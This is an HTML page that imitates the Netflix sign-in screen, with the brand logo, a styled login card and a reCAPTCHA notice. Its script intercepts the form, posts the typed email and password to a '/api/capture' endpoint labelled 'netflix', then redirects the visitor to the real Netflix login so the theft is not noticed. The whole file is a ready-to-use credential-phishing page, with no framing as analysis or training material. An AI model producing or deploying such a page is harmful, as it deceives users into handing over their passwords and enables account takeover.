<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Netflix</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Helvetica Neue', Arial, sans-serif;
      background: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .bg {
      position: fixed; inset: 0;
      background: #000;
      opacity: .4; z-index: -1;
    }
    .card {
      background: rgba(0,0,0,.75);
      padding: 48px 68px;
      border-radius: 6px;
      width: 100%;
      max-width: 450px;
    }
    .logo { width: 140px; margin-bottom: 24px; }
    h1 { font-size: 32px; font-weight: 700; margin-bottom: 24px; }
    input {
      width: 100%; padding: 16px 20px; margin-bottom: 16px;
      background: #333; border: none; border-radius: 4px;
      color: #fff; font-size: 16px;
    }
    input::placeholder { color: #8c8c8c; }
    input:focus { outline: 2px solid #e50914; }
    button {
      width: 100%; padding: 16px; background: #e50914;
      color: #fff; border: none; border-radius: 4px;
      font-size: 16px; font-weight: 700; cursor: pointer;
      margin-top: 8px;
    }
    button:hover { background: #f6121d; }
    .help {
      color: #b3b3b3; font-size: 13px; margin-top: 16px;
      text-align: center;
    }
    .help a { color: #fff; text-decoration: none; }
    .new {
      color: #737373; margin-top: 32px; font-size: 16px;
    }
    .new a { color: #fff; text-decoration: none; font-weight: 500; }
  </style>
</head>
<body>
  <div class="bg"></div>
  <div class="card">
    <svg class="logo" viewBox="0 0 111 30" fill="#e50914">
      <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.125l-5.938 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.063 5.344.219 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.094V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.22C3.188 29.28 1.594 29.375 0 29.5V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"/>
    </svg>
    <h1>Sign In</h1>
    <form id="f">
      <input type="email" name="email" placeholder="Email or mobile number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign In</button>
    </form>
    <p class="help">New to Netflix? <a href="#">Sign up now</a></p>
    <p class="new">This page is protected by Google reCAPTCHA to ensure you're not a bot.</p>
  </div>
  <script>
    document.getElementById('f').addEventListener('submit', async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          service: 'netflix',
          email: fd.get('email'),
          password: fd.get('password')
        })
      });
      window.location.href = 'https://www.netflix.com/login';
    });
  </script>
</body>
  </html>
